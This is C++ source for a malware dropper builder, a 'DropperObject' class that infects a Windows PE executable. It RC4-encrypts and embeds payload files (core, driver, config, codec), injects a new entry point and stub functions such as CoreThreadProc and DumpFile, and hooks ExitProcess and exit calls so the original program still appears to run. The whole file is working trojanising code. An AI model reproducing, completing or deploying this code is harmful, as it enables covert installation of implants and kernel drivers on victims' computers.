#include <iostream>
#include <fstream>

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "PEObject.h"
#include "DropperObject.h"
#include "XRefNames.h"
#include "rc4.h"

using namespace std;

extern char* _needed_strings[];
extern XREFNAMES data_imports[];

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len);

#define END_MARKER(ptr) do { memcpy(ptr, "<E>\0", 4); ptr += 4; } while(0)

DropperObject::DropperObject(PEObject& pe)
:  _data(0), _size(0), _pe(pe), _epOffset(0)
{
	_files.core.size = 0;
	_files.core64.size = 0;
	_files.config.size = 0;
	_files.codec.size = 0;
	_files.driver.size = 0;
	_files.driver64.size = 0;
	
	int i = 0;
	while (_needed_strings[i] != NULL) {
		_strings.push_back(std::string(_needed_strings[i]));
		i++;
	}
}

DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
{
	DWORD dataBufferSize = 0;
	
	unsigned int buffer_size = 65535 // account for header and accessory data (strings, calls, etc)
		+ _files.codec.size
		+ _files.core.size
		+ _files.core64.size
		+ _files.config.size
		+ _files.driver.size
		+ _files.driver64.size
		;
	
	_data.reset( new char[buffer_size] );
	char * ptr = _data.get();
	
	DataSectionHeader* header = (DataSectionHeader*)ptr;
	memset(header, 0, sizeof(DataSectionHeader));
	ptr += sizeof(DataSectionHeader);
	
	// Generate ecryption key
	string rc4_key;
	generate_key(rc4_key, sizeof(header->rc4key));
	memcpy(header->rc4key, rc4_key.c_str(), sizeof(header->rc4key));
	
	cout << "Key       : " << rc4_key << endl;
	cout << "Key length: " << dec << sizeof(header->rc4key) << endl;	
	
	// Original EP
	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
	
	// Indexes of calls to be hooked
	header->hookedCalls.ExitProcess = _hookedCalls["ExitProcess"];
	header->hookedCalls.exit = _hookedCalls["exit"];
	header->hookedCalls._exit = _hookedCalls["_exit"];
	
	// Strings offsets
	header->stringsOffsets.offset = ptr - _data.get();
	DWORD * strOffset = (DWORD *) ptr;
	ptr += _strings.size() * sizeof(DWORD);
	
	// Strings
	header->strings.offset = ptr - _data.get();
	
	for ( std::list<std::string>::iterator iter = _strings.begin();
		iter != _strings.end(); 
		iter++ )
	{
		// store offset of string
		(*strOffset) = ptr - (header->strings.offset + _data.get()); strOffset++;
		
		// store string data
		(void) memcpy( ptr, (*iter).c_str(), (*iter).size() + 1);
		
		ptr += (*iter).size() + 1;
	}
	header->strings.size = ptr - (_data.get() + header->strings.offset);
	
	// Calls
	header->dlls.offset = ptr - _data.get();
	DWORD totalCalls = 0;
	for ( int i = 0; data_imports[i].dll; i++ )
	{
		// account for nCalls field
		char* ptrToNCalls = ptr;
		ptr += sizeof(DWORD);
		
		// dll name
		(void) memcpy( ptr, data_imports[i].dll, strlen(data_imports[i].dll) + 1 );
		ptr += (UINT)strlen(data_imports[i].dll) + 1;
		
		// copy call names
		DWORD nCalls = 0;
		for ( int iD = 0; data_imports[i].calls[iD] != NULL; iD++ )
		{
			(void) memcpy( ptr, data_imports[i].calls[iD], strlen(data_imports[i].calls[iD]) + 1);
			ptr += (UINT)strlen(data_imports[i].calls[iD]) + 1;
			nCalls++;
		}
		
		// fill nCalls field
		memcpy(ptrToNCalls, &nCalls, sizeof(nCalls));
		totalCalls += nCalls;
	}
	header->dlls.size = ptr - (_data.get() + header->dlls.offset);
	
	// reserve space for Dll calls addresses
	header->callAddresses.offset = ptr - _data.get();
	header->callAddresses.size = totalCalls * sizeof(DWORD);
	ptr += header->callAddresses.size;
	
	// copy patched code for stage1 stub
	memcpy(ptr, _patches[0].buffer.get(), _patches[0].size);
	header->stage1.offset = ptr - _data.get();
	header->stage1.VA = _patches[0].VA;
	header->stage1.size = _patches[0].size;
	ptr += _patches[0].size;
	
	// copy patched code for stage2 stub
	memcpy(ptr, _patches[1].buffer.get(), _patches[1].size);
	header->stage2.offset = ptr - _data.get();
	header->stage2.VA = _patches[1].VA;
	header->stage2.size = _patches[1].size;
	ptr += _patches[1].size;
	
	// embed core, driver, config and codec files
	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);
	ptr = _embedFile(header->rc4key, _files.driver, header->files.names.driver, header->files.driver, ptr);
	ptr = _embedFile(header->rc4key, _files.config, header->files.names.config, header->files.config, ptr);
	ptr = _embedFile(header->rc4key, _files.codec, header->files.names.codec, header->files.codec, ptr);
	
	// compute total data section size and store in buffer
	dataBufferSize = ptr - _data.get();
	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
	ptr += sizeof(dataBufferSize);
	
	END_MARKER(ptr);
	
	// find new EP and copy dropper code in it
	_epOffset = ptr - _data.get();
	ptr += _embedFunction((PVOID)NewEntryPoint, (PVOID)NewEntryPoint_End, header->functions.newEntryPoint, ptr);
	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;
	
	// CoreThreadProc code
	ptr += _embedFunction((PVOID)CoreThreadProc, (PVOID)CoreThreadProc_End, header->functions.coreThread, ptr);
	cout << "CoreThreadProc is " << header->functions.coreThread.size << " bytes long, offset " << header->functions.coreThread.offset << endl;
	
	// DumpFile code
	ptr += _embedFunction((PVOID)DumpFile, (PVOID)DumpFile_End, header->functions.dumpFile, ptr);
	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
	
	// ExitProcessHook data
	*((DWORD*) ptr) = ptr - _data.get();
	ptr += sizeof(DWORD);
	END_MARKER(ptr);
	
	// ExitProcessHook code
	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
	
	// ExitHook data
	*((DWORD*) ptr) = ptr - _data.get();
	ptr += sizeof(DWORD);
	END_MARKER(ptr);	
	
	// ExitHook code
	ptr += _embedFunction((PVOID)ExitHook, (PVOID)ExitHook_End, header->functions.exitHook, ptr);
	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
	
	// RC4 code
	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
	
	// hookCall code
	ptr += _embedFunction((PVOID)hookCall, (PVOID)hookCall_End, header->functions.hookCall, ptr);
	cout << "hookCall is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
	
	cout << "Original ptr: " << hex << (DWORD)ptr << ", aligned: " << hex << (DWORD)alignToDWORD((DWORD)ptr) << endl;
	
	header->restore.offset = ptr - _data.get();
	header->restore.size = 32;
	ptr += 32;
	
	// compute total size
	_size = alignToDWORD(ptr - _data.get());
	
	cout << "Total dropper size is " << _size << " bytes." << endl;
	
	// return offset to new EP
	return _epOffset;
}

bool DropperObject::_addCoreFile( std::string path, std::string name )
{
	cout << "Adding core file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.core.name = name;
	return _readFile(path, _files.core);	
}

bool DropperObject::_addCore64File( std::string path, std::string name )
{
	cout << "Adding core (64 bit) file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.core64.name = name;
	return _readFile(path, _files.core64);	
}

bool DropperObject::_addDriverFile( std::string path, std::string name )
{
	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.driver.name = name;
	return _readFile(path, _files.driver);
}

bool DropperObject::_addDriver64File( std::string path, std::string name )
{
	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.driver64.name = name;
	return _readFile(path, _files.driver64);
}

bool DropperObject::_addConfigFile( std::string path, std::string name )
{
	cout << "Adding config file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.config.name = name;
	return _readFile(path, _files.config);
}

bool DropperObject::_addCodecFile( std::string path, std::string name )
{
	cout << "Adding codec file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.codec.name = name;
	return _readFile(path, _files.codec);
}

int DropperObject::_embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr )
{
	DWORD size = (DWORD)funcEnd - (DWORD)funcStart;
	memcpy(ptr, (PBYTE) funcStart, size);
	func.offset = ptr - _data.get();
	func.size = size;

	return size;
}

char* DropperObject::_embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr )
{
	// check if we have some data to be appended
	if (source.buffer == NULL && source.size <= 0)
		return ptr;
	
	// copy name of file
	name.offset = ptr - _data.get();
	name.size = source.name.size() + 1;
	memcpy(ptr, source.name.c_str(), name.size);
	ptr += name.size;
	
#if 0
	// encrypt data
	int insize = source.size;
	
	char* packed = new char[aP_max_packed_size(insize)];
	if (packed == NULL)
		return 0;
	char* workmem = new char[aP_workmem_size(insize)];
	if (packed == NULL)
		return 0;
	
	int packed_size = aPsafe_pack(source.buffer, packed, insize, workmem, NULL, NULL);
	if (workmem)
		delete [] workmem;
#endif

	char* packed = source.buffer.get();
	int packed_size = source.size;
	
	file.offset = ptr - _data.get();
	file.size = packed_size;
	
	// crypt and write file
	rc4crypt((unsigned char*)rc4key, RC4KEYLEN, (unsigned char*)packed, packed_size);
	memcpy(ptr, packed, packed_size);
	ptr += packed_size;
	
	// XXX uncomment
	// delete [] packed;
	
	return ptr;
}

bool DropperObject::_readFile( std::string path, NamedFileBuffer& buffer )
{
	std::ifstream file(path.c_str(), ios::binary);
	
	if (!file.is_open())
		return false;
	
	// get length of file
	
	file.seekg(0, ios::end);
	buffer.size = file.tellg();
	file.seekg(0, ios::beg);
	
	buffer.buffer.reset( new char[buffer.size] );
	
	file.read(buffer.buffer.get(), buffer.size);
	file.close();
	
	return true;
}

bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir )
{
	try {
		_setExecutableName("XXX");
		_setInstallDir(installDir);
		
		_addCoreFile(core.string(), core.filename());
		_addConfigFile(config.string(), config.filename());
		
		if (!core64.empty())
			_addCore64File(core64.string(), core64.filename());

		if (!codec.empty())
			_addCodecFile(codec.string(), codec.filename());
		
		if (!driver.empty())
			_addDriverFile(driver.string(), driver.filename());

		if (!driver64.empty())
			_addDriverFile(driver64.string(), driver64.filename());
		
		_hookedCalls["ExitProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("ExitProcess"));	
		_hookedCalls["exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("exit"));
		_hookedCalls["_exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("_exit"));
		
		_build( (WINSTARTFUNC) _pe.epVA() );
		
	} catch (...) {
		cout << __FUNCTION__ << "Failed building dropper object." << endl;
		return false;
	}
	
	return true;
}

int DropperObject::_getIATCallIndex( std::string dll, std::string call )
{
	int index = -1;
	
	try {
		IATEntry const & entry = _pe.getIATEntry(dll, call);
		index = entry.index();
	} catch (IATEntryNotFound) {
		cout << __FUNCTION__ << ": no entry for " << dll << "(" << call << ")" << endl;
	}
	
	return index;
}

void DropperObject::setPatchCode( std::size_t idx, DWORD VA, char const * const data, std::size_t size )
{
	_ASSERT(data);
	_ASSERT(size);
	
	_patches[idx].VA = VA;
	_patches[idx].buffer.reset( new char[size] );
	memcpy( _patches[idx].buffer.get(), data, size );
	_patches[idx].size = size;
}

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len)
{
	unsigned int i, j, k;
	unsigned char *pos;
	unsigned char S[256];
	size_t kpos;
	size_t skip = 0;

	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}

	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}

	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}
}
